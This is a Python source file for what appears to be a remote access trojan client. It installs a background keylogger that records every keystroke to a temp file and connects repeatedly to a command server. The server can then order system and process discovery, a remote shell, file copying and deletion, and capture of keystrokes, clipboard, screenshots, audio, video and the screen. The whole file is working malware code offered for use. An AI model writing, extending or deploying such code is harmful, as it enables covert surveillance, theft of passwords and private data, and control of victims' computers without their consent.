import os
import platform
import socket
import logging
import time
import tempfile
from pynput.keyboard import Listener
from modules.client_module import (gather_system_info, command_line_interface, 
                                file_directory_discovery, remote_file_copy,
                                file_deletion, process_discovery, input_capture,
                                clipboard_data, screenshot_capture, audio_capture,
                                video_capture, screen_capture)
from modules.connection_module import SecureConnectionClient


LOG_FILE = tempfile.gettempdir() + "\keys.txt"
print(LOG_FILE)
SERVER_IP = "127.0.0.1"
SERVER_PORT = 585
RETRY_INTERVAL = 5

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")
def onpress(key):
    logging.info(str(key))

connection = None

def connect_to_server():
    global connection
    try:
        connection = SecureConnectionClient(server_ip=SERVER_IP, server_port=SERVER_PORT)
        if connection:
            operation_system = platform.system()[0]
            connection.send_data(operation_system)
            return True
    except Exception as ex:
        logging.error(f"Error connecting to the server: {ex}")


def main():
    while True:
        if connect_to_server():
            operation_system = platform.system()
            while True:
                try:
                    byte = connection.receive_data().decode("utf-8")
                    if not byte:
                        print("Connection closed by the server.")
                        break
                    if byte == "1":
                        gather_system_info(connection, operation_system)
                    elif byte == "2":
                        command_line_interface(connection)
                    elif byte == "3":
                        file_directory_discovery(connection, operation_system)
                    elif byte == "4":
                        remote_file_copy(connection)
                    elif byte == "5":
                        file_deletion(connection)
                    elif byte == "6":
                        process_discovery(connection, operation_system)
                    elif byte == "7":
                        input_capture(connection)
                        os.remove("keys.txt")
                    elif byte == "8":
                        clipboard_data(connection)
                    elif byte == "9":
                        screenshot_capture(connection)
                    elif byte == "A":
                        audio_capture(connection)
                    elif byte == "B":
                        video_capture(connection)
                    elif byte == "C":
                        screen_capture(connection)
                        print("bomba")
                    elif byte == "S":
                        break
                except socket.error as e:
                    print(f"Error: {e}")
                    break
        else:
            logging.info(f"Cannot connect to the server: waiting {RETRY_INTERVAL} seconds.")
            time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    with Listener(on_press=onpress):
        main()